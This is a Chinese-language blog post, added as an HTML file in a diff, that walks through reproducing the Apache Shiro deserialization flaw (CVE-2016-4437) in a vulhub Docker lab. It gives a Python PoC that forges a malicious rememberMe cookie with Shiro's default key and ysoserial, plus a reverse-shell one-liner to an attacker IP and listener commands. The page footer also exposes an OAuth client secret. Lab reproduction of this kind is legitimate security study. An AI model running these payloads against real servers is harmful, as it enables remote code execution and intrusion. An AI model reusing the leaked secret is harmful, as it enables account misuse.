@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            shiro反序列化漏洞复现
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png"/>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    
+<link rel="stylesheet" href="/css/hljs.min.css">
+
+    
+<script src="/js/hljs.min.js"></script>
+  
+    
+<script src="/js/gitment.browser.js"></script>
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hexo
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/vevlins/" target="_blank" rel="noopener" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)"></input>
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2020/04/18/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"> 
+                    shiro反序列化漏洞复现 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2020-04-18   
+                </a>
+                
+                
+                
+                    
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#准备工作"><span class="toc-list-text">准备工作</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#靶场"><span class="toc-list-text">靶场</span></a></li></ol>
+</div>
+            <div class="content">
+                <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
+<li>vulhub靶场搭建</li>
+</ol>
+<p><strong>参照官网：<a href="https://vulhub.org/#/docs/install-docker-one-click/" target="_blank" rel="noopener">https://vulhub.org/#/docs/install-docker-one-click/</a></strong><br>    1. 安装docker：<code>curl -s https://get.docker.com/ | sh</code><br>    2. 安装pip：<code>curl -s https://bootstrap.pypa.io/get-pip.py | python</code><br>    3. 安装docker-compose：<code>pip install docker-compose</code><br>    4. 拉取Vulhub到本地：<code>git clone https://github.com/vulhub/vulhub.git</code></p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><ol>
+<li>cd到 ”/vulhub/shiro/cve-2016-4437“ 目录，启动环境：<code>docker-compose up -d</code></li>
+<li>访问本地8080端口，靶场界面如下：</li>
+</ol>
+<p><em>不清楚端口的可以执行<code>docker ps -a</code> 查看映射端口</em><br><img src="https://i.loli.net/2020/04/18/EHmc7T28piaJVUL.jpg" alt=""></p>
+<p>##开整</p>
+<ol>
+<li>github下载‘ysoserial-master-30099844c6-1.jar’</li>
+</ol>
+<p><strong>付下载链接：<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" target="_blank" rel="noopener">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></strong><br>2. poc脚本：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-master-30099844c6-1.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>
+
+<p>  <strong>要求 ysoserial-master-30099844c6-1.jar和poc.py放在同一目录下</strong></p>
+<ol start="3">
+<li><p>执行脚本生成恶意cookie：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py x.x.x.x:1099  (x.x.x.x:攻击方ip，端口可自定，注意与后面的操作对应)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>注意：1. 在python2环境下运行。2.报错“No matching distribution found for Crypto.Cipher”，解决：<code>pip install pycrypto</code></strong></p>
+<ol start="4">
+<li>shellcode及加密</li>
+</ol>
+<ul>
+<li>加密网站：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;7878 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<img src="https://i.loli.net/2020/04/18/hOsK6wqxXeJUnpl.jpg" alt=""></li>
+</ul>
+<ol start="5">
+<li>端口监听<ol>
+<li>监听shell：<code>ncat -lv -p 7878</code></li>
+<li>监听JRMP端口：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &#39;加密后的反弹shell&#39;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>burp发送恶意cookie<br><img src="https://i.loli.net/2020/04/18/DxvGtlHNMqjW4EB.jpg" alt=""></li>
+<li>shell反弹<br><img src="https://i.loli.net/2020/04/18/wlchNRvItC5AxUd.jpg" alt=""></li>
+</ol>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="http://yoursite.com/2020/04/18/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">http://yoursite.com/2020/04/18/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+<li>
+    <img src="/img/qrcode.jpeg"></img>
+</li>
+
+ 
+<li>
+    <img src="/img/qrcode.jpeg"></img>
+</li>
+
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+<div></div>
+
+    <div class="next">
+    <a href="/2020/04/01/vulnstack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E5%8F%8D%E5%BC%B9shell2/"> vulnstack靶场学习记录-反弹shell2 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Sat Apr 18 2020 22:41:50 GMT+0800",
+    owner: "Vevlins",
+    repo: "Vevlins.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    
+<script src="/js/jquery.js"></script>
+
+    
+<script src="/js/toki.js"></script>
+  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
